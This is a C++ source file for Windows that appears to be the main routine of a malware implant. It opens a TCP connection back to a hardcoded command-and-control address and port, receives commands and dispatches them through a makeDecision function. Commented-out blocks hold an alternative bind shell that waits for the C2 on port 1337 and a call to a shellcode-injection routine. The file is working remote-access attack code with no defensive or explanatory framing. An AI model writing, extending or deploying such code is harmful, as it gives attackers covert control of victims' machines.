#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable:4996)

#include "winsock2.h"
#include "windows.h"
#include <WS2tcpip.h>
#include <iostream>
#include "getSyscall.h"
#include "injectShellcode.h"
#include "makeDecision.h"


int main(int argc, char* argv[]) {
	WSADATA wsaData;
	int iResult;
	SOCKET ConnectSocket = INVALID_SOCKET;
	struct addrinfo* result = NULL, * ptr = NULL, hints;
	
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	const char* sendbuf = "this is a test";
	char recvbuf[1024];
	int recvbuflen = 1024;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	//172.23.21.137
	iResult = getaddrinfo("192.168.43.1", "6969", &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
		ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (ConnectSocket == INVALID_SOCKET) {
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			ConnectSocket = INVALID_SOCKET;
			continue;
		}
		break;
	}

	freeaddrinfo(result);

	if (ConnectSocket == INVALID_SOCKET) {
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	/*
	iResult = send(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
	if (iResult == SOCKET_ERROR) {
		printf("send failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	printf("Bytes Sent: %ld\n", iResult);

	iResult = shutdown(ConnectSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}
	*/
	do {
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		printf("Result %d\n", iResult);
		if (iResult > 0) {
			printf("Bytes received: %d\n", iResult);

			makeDecision(recvbuf, iResult, ConnectSocket);
		}
		else if (iResult == 0) {
			printf("Connection closed\n");
		}
		else {
			printf("recv failed with error: %d\n", WSAGetLastError());
		}
	} while (iResult > 0);

	closesocket(ConnectSocket);
	WSACleanup();

	return 0;

	
	/* The Following Code is for a bind shell as it will listen for a connection from the C2 */
	/*
	WSADATA wsaData;
	int iResult = 0;

	SOCKET ListenSocket = INVALID_SOCKET;
	sockaddr_in service;

	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != NO_ERROR) {
		printf("WSAStartup() failed with error: %d\n", iResult);
		return 1;
	}

	ListenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket function failed with error: %ld\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	service.sin_family = AF_INET;
	service.sin_addr.s_addr = inet_addr("0.0.0.0");
	service.sin_port = htons(1337);

	iResult = bind(ListenSocket, (SOCKADDR*)&service, sizeof(service));
	if (iResult == SOCKET_ERROR) {
		printf("bind function failed with error %d\n", WSAGetLastError());
		iResult = closesocket(ListenSocket);
		if (iResult == SOCKET_ERROR) {
			printf("closesocket function failed with error %d\n", WSAGetLastError());
		}
		WSACleanup();
		return 1;
	}

	if (listen(ListenSocket, SOMAXCONN) == SOCKET_ERROR) {
		printf("listen function failed with error: %d\n", WSAGetLastError());
	}

	printf("Listening on socket...\n");

	SOCKET ClientSocket;

	ClientSocket = INVALID_SOCKET;

	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	
	char recvbuf[512];
	int iSendResult;
	int recvbuflen = 512;

	memset(&recvbuf[0], '\0', sizeof(recvbuf));

	do {
		iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0) {
			printf("Bytes received: %d\n", iResult);
			
			makeDecision(recvbuf, iResult, ClientSocket);
			
			iSendResult = send(ClientSocket, recvbuf, iResult, 0);
			
			if (iSendResult == SOCKET_ERROR) {
				printf("send failed: %d\n", WSAGetLastError());
				closesocket(ClientSocket);
				WSACleanup();
				return 1;
			}
			printf("Bytes sent: %d\n", iSendResult);
		}
		else if (iResult == 0) {
			printf("Connection closing...\n");
		}
		else {
			printf("recv failed: %d\n", WSAGetLastError());
			closesocket(ClientSocket);
			WSACleanup();
			return 1;
		}
	} while (iResult > 0);

	iResult = closesocket(ListenSocket);
	if (iResult == SOCKET_ERROR) {
		printf("closesocket function failed with error %d\n", WSAGetLastError());
		WSACleanup();
		return 1;
	}

	WSACleanup();
	return 0;
	*/
	/*
	BOOL spawnProc = true;
	int PID = 0;
	BOOL unsafe = false;

	injectShellcode(spawnProc, PID, unsafe);

	return 0;
	*/
}